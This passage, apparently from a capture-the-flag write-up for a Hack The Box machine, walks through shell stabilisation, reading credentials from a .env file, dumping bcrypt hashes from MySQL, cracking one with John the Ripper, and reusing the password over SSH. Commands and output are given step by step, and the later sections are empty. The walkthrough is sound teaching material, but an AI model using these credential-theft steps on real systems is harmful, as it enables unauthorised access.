|`stty rows 50 columns 200`|Sets the remote terminal dimensions|Stops long lines wrapping in the wrong place|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

darkzero@SRV01:~$ export TERM=xterm
darkzero@SRV01:~$ stty rows 50 columns 200
darkzero@SRV01:~$ 
```

**What this gives you:** A fully interactive TTY session.

**Key findings:**

- Tab completion, command history, and Ctrl+C now function correctly within the remote shell rather than affecting the local listener.
- Commands requiring a controlling terminal — `su`, `ssh`, interactive password prompts, full-screen editors — will now work. This matters directly: later phases require `ssh` and `ksu`, both of which read from `/dev/tty` and fail on an unstabilised shell.
- `python3` is present on the target, which also indicates a scripting interpreter is available for later post-exploitation work.
<div align="center">
<br>
<br>
</div>

##### Why a netcat shell is not a terminal

A shell obtained through netcat is bash reading from and writing to a network socket. A socket is not a terminal, and a great deal of Unix behaviour quietly assumes a terminal exists.

A pseudo-terminal (PTY) is a kernel-provided device pair that emulates a physical terminal. It handles line editing, translates Ctrl+C into a SIGINT signal for the foreground process group, tracks window dimensions, and supports the `ioctl` calls that programs use to query terminal state. Without one, `bash` reports `Inappropriate ioctl for device` — it asked the kernel about a terminal that is not there.

The upgrade has two halves, and both are needed.

Remotely, `pty.spawn` creates a PTY and runs bash attached to it. Bash now has a proper terminal and job control works on the target side.

Locally, your own terminal is still in cooked mode: buffering input until Enter, echoing keystrokes, and capturing Ctrl+C for itself. With two terminals both processing input, keystrokes get handled twice and signals go to the wrong process. `stty raw -echo` disables all of it, reducing the local terminal to a transparent pipe so that only the remote PTY interprets anything.

If Python is unavailable, `script -qc /bin/bash /dev/null` allocates a PTY through the `script` utility instead. Where `socat` exists on both hosts it provides a fully-featured TTY in a single step, though it is rarely installed on targets by default.

**Next:** Enumerate the application directory for configuration files containing stored credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 — Enumerate the application directory

**Why this step:** A foothold exists as the web service account. Application service accounts commonly hold database credentials on disk. Enumerate `/opt` to locate the deployment and identify other software present on the host.

**Command:**

```bash
ls -la /opt/
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ls`|List directory contents|Shows what's in a folder|
|`-l`|Long format: permissions, owner, group, size, date|Shows who owns what and who can read it|
|`-a`|Include entries beginning with a dot|Reveals hidden files such as `.env`|
|`/opt/`|Conventional location for optional/third-party software|Where manually-deployed applications usually live|

**Result:**

```
total 24
drwxr-xr-x  6 root       root     4096 Jul 21 05:39 .
drwxr-xr-x 23 root       root     4096 Jul 20 13:13 ..
drwxrwxr-x  6 darkzero   darkzero 4096 Jul 14 06:10 DarkZero_Campaigns
drwxr-x---  4 svc-runner root     4096 May 20 23:36 gitea-runner
drwxr-xr-x  5 root       root     4096 Jul 21 05:38 sysinternalsEBPF
drwx------  2 root       root     4096 Jul 29 04:54 sysmon
```

**What this gives you:** The application root, plus evidence of two other systems on the host.

**Directory analysis:**

|Directory|Owner|Mode|Accessible as `darkzero`|Significance|Simple Explanation|
|---|---|---|---|---|---|
|`DarkZero_Campaigns`|darkzero|`drwxrwxr-x`|Read + write|The compromised web application|Our own app — full access|
|`gitea-runner`|svc-runner|`drwxr-x---`|**No**|Self-hosted Gitea Actions CI/CD runner|A build system that runs jobs as another user|
|`sysinternalsEBPF`|root|`drwxr-xr-x`|Read|Microsoft Sysinternals eBPF monitoring|Security monitoring, not a target|
|`sysmon`|root|`drwx------`|No|Microsoft Sysmon for Linux|Logs activity — assume actions are recorded|

**Key findings:**

- The application root is `/opt/DarkZero_Campaigns`, owned by `darkzero` and fully accessible from the current shell. Configuration files stored there are readable.
- **A Gitea Actions runner is installed at `/opt/gitea-runner`, owned by `svc-runner`.** The directory is unreadable from the current account, but its presence establishes that a self-hosted CI/CD runner executes jobs on this host as a distinct service account. CI/CD runners execute attacker-supplied workflow definitions with the runner account's privileges, making `svc-runner` a lateral-movement target.
- Gitea itself is not running from `/opt` — only the runner agent is present. The Gitea server is hosted elsewhere, presumably on the internal network the runner connects to.
- Microsoft Sysinternals tooling (`sysinternalsEBPF`, `sysmon`) is deployed on this Linux host. Sysmon for Linux records process creation, network connections, and file activity. This corroborates the Windows-centric environment inferred from the OS fingerprint in 1.3, and means post-exploitation activity is being logged.
- `svc-runner` and `root` are the only other local identities visible so far.

**Next:** Read the application's environment configuration for stored database credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.5 — Read the application environment configuration

The web application connects to a database and therefore holds credentials on disk. Node.js deployments conventionally store secrets in a `.env` file at the project root, readable by the account the service runs as — the account already compromised.

**Command:**

```bash
cat /opt/DarkZero_Campaigns/.env
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`cat`|Print a file's contents to stdout|Show me what's in this file|
|`/opt/DarkZero_Campaigns/.env`|Environment configuration at the application root|Where Node apps keep their secrets|

**Result:**

```shell
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

**What this gives you:** Cleartext database credentials and the application's session signing key.

**Configuration analysis:**

|Key|Value|Significance|Simple Explanation|
|---|---|---|---|
|`PORT`|`8081`|Node listens on 8081; nginx proxies port 80 to it|The app's real port, hidden behind the web server|
|`DB_HOST`|`localhost`|Database is on this host, not remote|MySQL runs here, not somewhere else|
|`DB_USER`|`darkzero`|Database account name|Login name for the database|
|`DB_PASSWORD`|`C4ntFindMyDMpass!`|**Cleartext database password**|The database password, in plain text|
|`DB_NAME`|`darkzero_campaigns`|Target schema|Which database to open|
|`SESSION_SECRET`|`DarkSession312#`|HMAC key signing the `dz.sid` cookie|The key that proves a session cookie is genuine|

**Key findings:**

- **Database credentials recovered in cleartext:** `darkzero : C4ntFindMyDMpass!` against schema `darkzero_campaigns` on localhost. No exploitation was required — the file is necessarily readable by the service account.
- The session signing secret `DarkSession312#` is also exposed. Possession of this key permits forging arbitrary `dz.sid` session cookies, allowing authentication as any application user without knowing their password. Not needed here since database access supersedes it, but it is a complete authentication bypass in its own right.
- `PORT=8081` confirms the architecture inferred during reconnaissance: nginx on port 80 reverse-proxies to a Node.js process bound to 8081. Only nginx is externally exposed.
- Both the database password and session secret are weak, human-chosen strings rather than generated values. Reference material for this target records placeholder values (`change_me`) in these fields; this instance carries real credentials.

**Next:** Authenticate to the local MySQL instance with the recovered credentials and enumerate the users table for stored password hashes.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### #### 3.6 — Dump the application users table

Cleartext database credentials were recovered from the application's environment file. Authenticate to the local MySQL instance and dump the users table to obtain stored password hashes.

**Command:**

```bash
mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`mysql`|MySQL command-line client|The program that talks to the database|
|`-u darkzero`|Username from `DB_USER`|Who to log in as|
|`-p'C4ntFindMyDMpass!'`|Password from `DB_PASSWORD`, single-quoted|The password. Quotes are required — `!` triggers bash history expansion unquoted|
|`-h localhost`|Host from `DB_HOST`|Connect to the database on this machine|
|`-D darkzero_campaigns`|Schema from `DB_NAME`|Which database to open|
|`-e "SELECT * FROM users;"`|Execute a query and exit|Run one command instead of opening an interactive session|

**Result:**

```shell
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username             | password_hash                                                | role   | created_at          |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin                | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh                 | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | nedmoeca@nimbaya.com  | nedmoeca@nimbaya.com | $2b$10$4sBqCdavaqgfbMYVXYdH3Ogf.MBui68v9KDBNtF6K6opZrWFgPqSm | player | 2026-07-29 09:53:28 |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
```

**What this gives you:** Password hashes for every application user.

**User analysis:**

|id|Username|Role|Created|Significance|Simple Explanation|
|---|---|---|---|---|---|
|1|`admin`|admin|2026-04-19|Application administrator, seeded with the box|Built-in admin account|
|3|`josh`|player|2026-05-19|A named individual, created separately from seed data|A real person's account — likely a real system user too|
|4|`nedmoeca@nimbaya.com`|player|2026-07-29|Account registered during this engagement|Ours; no value|

**Key findings:**

- Three password hashes recovered, all bcrypt in `$2b$10$` format. The `$2b$` prefix identifies bcrypt; `10` is the cost factor, meaning 2¹⁰ key-expansion rounds.
- **`josh` is the priority target.** The account is a named individual rather than a generic role, and was created a month after the seeded `admin`. Application usernames frequently correspond to operating-system or domain accounts, so cracking this hash may yield credentials reusable beyond the web application.
- Note the gap at `id = 2`. A row was deleted from this table at some point. The live database no longer holds it — but a backup taken before the deletion would.
- The `admin` hash is available but the role grants only application-level privileges already superseded by shell access. Deprioritised.
- `SELECT *` succeeded, confirming the `darkzero` database account has read access across the schema rather than restricted per-column grants.
<div align="center">
<br>
<br>
</div>

##### Reading a bcrypt hash, and why the format matters

A stored hash advertises its own algorithm. The string begins with a modular-crypt prefix identifying the scheme, and recognising it immediately narrows what tool and mode to use.

```
$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK
 └┬┘ └┬┘ └──────────────────────┬───────────────────────────┘
  │   │                          │
  │   │                          └─ 22-char salt + 31-char hash, Base64-encoded
  │   └─ cost factor: 2^10 = 1024 rounds
  └─ algorithm: bcrypt (2b = current revision)
```

Common prefixes worth memorising:

|Prefix|Algorithm|hashcat mode|
|---|---|---|
|`$2a$` / `$2b$` / `$2y$`|bcrypt|3200|
|`$1$`|MD5-crypt|500|
|`$5$`|SHA-256-crypt|7400|
|`$6$`|SHA-512-crypt|1800|
|`$argon2id$`|Argon2id|34000|
|32 hex chars, no prefix|Raw MD5|0|
|40 hex chars, no prefix|Raw SHA-1|100|

Bcrypt is deliberately slow. The cost factor is an exponent, so each increment doubles the work — cost 10 means 1024 rounds of key expansion per guess. On commodity hardware that translates to a few thousand guesses per second against bcrypt, versus billions per second against raw MD5.

The practical consequence is that bcrypt is only crackable when the password is weak. A wordlist attack against `rockyou.txt` will find `Rangers1` or `Summer2024`; it will not find a random 16-character string, and brute-forcing the keyspace is infeasible. So the decision to attempt a crack rests on a bet that the user chose something human — which, for a personal account on a hobby application, is a reasonable bet.

**Next:** Extract the target hash and attempt a dictionary attack.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.7 — Crack josh's password hash

The users table yielded bcrypt hashes for three accounts. `josh` is a named individual rather than a seeded role, making password reuse against system or domain accounts plausible. Attempt a dictionary attack against that hash alone.

**Commands:**

Write the hash to a file with its username, on the attacking host:

```bash
echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
```

Run the attack:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`echo '...' > josh.hash`|Write the hash to disk in `username:hash` format|Save the target. Single quotes are required — unquoted, bash expands `$2b` and `$10` as variables|
|`john`|John the Ripper password cracker|The cracking tool|
|`--format=bcrypt`|Declare the hash algorithm|Skips auto-detection and removes ambiguity|
|`--wordlist=...rockyou.txt`|Dictionary attack against ~14M real passwords|Try known human passwords rather than every possible string|
|`josh.hash`|Input file|What to crack|

Only josh's hash is loaded. Bcrypt salts are per-hash, so every additional hash in the file multiplies the work — each candidate password must be re-hashed against each distinct salt.

**Result:**

```shell
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2026-07-30 10:22) 0g/s 157.1p/s 157.1c/s 157.1C/s caitlin..yamaha
Rangers1         (josh)     
1g 0:00:02:52 DONE (2026-07-29 04:13) 0.005798g/s 156.7p/s 156.7c/s 156.7C/s babyboys..DAYANA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**What this gives you:** A cleartext credential pair for a named user.

**Key findings:**

- **Credentials recovered: `josh : Rangers1`.** Cracked in 2 minutes 52 seconds at approximately 157 candidates per second.
- Throughput doubles when cracking a single hash. An earlier run loading both `admin` and `josh` reported `71.48p/s` against `142.9c/s` — two crypt operations per candidate, because each bcrypt hash carries its own salt and a candidate must be hashed separately against each. Restricting the attack to the one hash that matters halves the runtime.
- `admin` was deliberately excluded. Its `admin` role confers application-level privileges only, already superseded by shell access on the host.
- The password is a weak dictionary word with a trailing digit, exactly the pattern bcrypt fails to protect against. Bcrypt's cost factor defends against exhaustive search, not against a password that appears in a public wordlist.
<div align="center">
<br>
<br>
</div>

##### Why salt count dictates cracking time

An unsalted hash function computes one digest per input. Crack a thousand raw MD5 hashes and you hash each candidate password once, then compare the result against all thousand — the cost is independent of how many hashes you are attacking.

Salting removes that economy deliberately. Every bcrypt hash embeds a random 22-character salt, mixed into the key schedule before the password is processed. Two users with identical passwords produce entirely different hashes. To test one candidate against two hashes, the full 1024-round key expansion must run twice.

This is visible directly in John's status line:

```
71.48p/s    142.9c/s     ← two hashes: 2 crypts per candidate
156.7p/s    156.7c/s     ← one hash:  1 crypt per candidate
```

`p/s` counts candidate passwords tried; `c/s` counts crypt operations performed. When they match, one hash is loaded. When `c/s` is a multiple of `p/s`, that multiple is the number of distinct salts.

The operational rule follows: load only hashes you actually need. Every extra target is a proportional multiplier on wall-clock time, and against a deliberately slow algorithm that multiplier is expensive.

**Next:** Test the recovered credentials against SSH, since port 22 was identified as externally exposed during reconnaissance.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.8 — Authenticate over SSH with recovered credentials

Port 22 was exposed externally from the initial scan but unusable without credentials. The cracked application password may be reused for the system account of the same name.

**Command:**

```bash
ssh josh@TARGET_IP
```

Password: `Rangers1`

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh`|Secure Shell client|Log in to a remote machine|
|`josh@`|Username matching the cracked application account|Try the same name on the operating system|
|`TARGET_IP`|Host from the initial scan|The target machine|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ ssh josh@10.129.54.208                      
The authenticity of host '10.129.54.208 (10.129.54.208)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.54.208' (ED25519) to the list of known hosts.
josh@10.129.54.208's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 11:18:57 AM UTC 2026

  System load:  0.0                Processes:             153
  Usage of /:   47.6% of 10.66GB   Users logged in:       0
  Memory usage: 64%                IPv4 address for eth0: 172.16.20.3
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

5 updates can be applied immediately.
5 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

josh@SRV01:~$
```

Search for the user flag:

```bash
josh@SRV01:~$ find / -name user.txt 2>/dev/null
josh@SRV01:~$
```

No results.

**What this gives you:** A stable, fully interactive session as a named user, and the internal network topology.

**Key findings:**

- **Password reuse confirmed.** `Rangers1` authenticates `josh` at both the application layer and the operating system. A credential recovered from a web application database granted direct SSH access.
- **SRV01 is dual-homed. Its internal address is `172.16.20.3` on `eth0`.** The externally-reachable HTB address is a separate interface. An entire internal subnet `172.16.20.0/24` exists that was invisible to external scanning — this is the pivot point into the rest of the environment.
- The host is Ubuntu 24.04.4 LTS on kernel 6.8.0-136, current enough that kernel-level privilege escalation is not a promising path.
- `user.txt` is not present anywhere on this filesystem. The user flag resides on a different host, confirming the engagement extends beyond SRV01.
- The session is a genuine SSH login with a controlling TTY, so no shell stabilisation is required. Interactive commands work directly.
- Outbound HTTPS fails (`Failed to connect to https://changelogs.ubuntu.com`), indicating the host has no direct internet egress. Tooling must be transferred from the attacking machine rather than downloaded.

**Next:** Enumerate listening services on SRV01, particularly those bound to loopback or the internal interface, which were unreachable from outside.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.9 — Enumerate listening services on SRV01

External scanning revealed only two open ports. Services bound to loopback or filtered at the network edge are invisible from outside but reachable from a foothold on the host. Enumerate all listening sockets to map the internal attack surface.

**Command:**

```bash
ss -tlnp
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ss`|Socket statistics utility, successor to `netstat`|Lists network connections and listeners|
|`-t`|TCP sockets only|Ignore UDP|
|`-l`|Listening sockets only|Show what's waiting for connections, not established ones|
|`-n`|Numeric output|Don't resolve port numbers to service names or IPs to hostnames|
|`-p`|Show owning process|Name the program behind each socket, where permissions allow|

**Result:**

```
State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port   Process
LISTEN   0        4096           127.0.0.54:53             0.0.0.0:*
LISTEN   0        511             127.0.0.1:8081           0.0.0.0:*
LISTEN   0        4096        127.0.0.53%lo:53             0.0.0.0:*
LISTEN   0        151             127.0.0.1:3306           0.0.0.0:*
LISTEN   0        4096              0.0.0.0:22             0.0.0.0:*
LISTEN   0        511               0.0.0.0:80             0.0.0.0:*
LISTEN   0        70              127.0.0.1:33060          0.0.0.0:*
LISTEN   0        4096                    *:41557                *:*
LISTEN   0        4096                 [::]:22                [::]:*
```

**What this gives you:** A complete inventory of services on the host, including those unreachable from outside.

**Listening service analysis:**

|Address:Port|Binding|Service|External?|Analysis|Simple Explanation|
|---|---|---|---|---|---|
|`127.0.0.1:8081`|Loopback|Node.js application|No|Matches `PORT=8081` from `.env`; nginx proxies to it|The web app itself, reachable only via nginx|
|`127.0.0.1:3306`|Loopback|MySQL|No|Already accessed with credentials from `.env`|The database — already looted|
|`127.0.0.1:33060`|Loopback|MySQL X Protocol|No|Alternate MySQL interface, same instance|Second door to the same database|
|`127.0.0.54:53`, `127.0.0.53%lo:53`|Loopback|systemd-resolved|No|Local DNS stub resolver|Standard Ubuntu name resolution|
|`0.0.0.0:22`, `[::]:22`|All interfaces|OpenSSH|Yes|The SSH access already in use|Remote login|
|`0.0.0.0:80`|All interfaces|nginx|Yes|The web application front end|The website|
|`*:41557`|**All interfaces**|**Unidentified**|**No**|Owner process not visible to `josh`; filtered externally|An unknown service run by another user|

**Key findings:**

- **An unidentified service listens on `*:41557`, bound to all interfaces.** No process name is shown, indicating it runs under a different user account. The port falls within the range covered by the initial full-port scan (1.2), yet did not appear in those results — so it is filtered at the network edge while remaining reachable from within the internal network.
- The likely owner is the Gitea Actions runner identified at `/opt/gitea-runner` in 3.4. That directory is owned by `svc-runner` and unreadable from the current account, consistent with a socket whose process details are hidden. A runner agent maintains a listener for job dispatch from its Gitea server.
- Every loopback-bound service is already understood and offers no new access. MySQL is looted, the Node app is compromised, and the DNS stubs are standard Ubuntu components.
- No Gitea _server_ is listening on this host. Only the runner agent is present, so the Gitea instance itself is on another machine within `172.16.20.0/24`.
- The internal subnet is reachable from SRV01 via `172.16.20.3` but not from the attacking host. Access to any internal service requires tunnelling through this foothold.

##### 3.9.1 Theory — Why loopback services are the first post-foothold target

A service bound to `127.0.0.1` accepts connections only from the machine itself. The kernel will not route external traffic to it. This is a deliberate and correct hardening measure: a database that only its own application needs to reach has no business being exposed to the network.

The consequence for an attacker is that external scanning systematically underreports the attack surface. Nmap against the public address of this host returned two ports. `ss -tlnp` from inside returns nine sockets. Seven services existed the entire time, invisible.

More importantly, loopback services are frequently configured on the assumption that only trusted local processes can reach them. Authentication may be weak, absent, or trivially bypassed, because the network boundary was treated as the security boundary. Once code execution is obtained on the host, that assumption fails completely — and the services behind it are often softer than anything facing the internet.

The distinct case here is `*:41557`. It is bound to all interfaces, not loopback, so it _is_ network-accessible — just not from outside, because a firewall filters it at the perimeter. That is a different security model with the same practical result: reachable now, unreachable before.

Running `ss -tlnp` immediately after establishing any foothold is therefore not optional. It routinely surfaces the path forward on machines where the external surface is a dead end, and it costs one command.

**Next:** Enumerate the internal network to identify hosts and services within `172.16.20.0/24`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

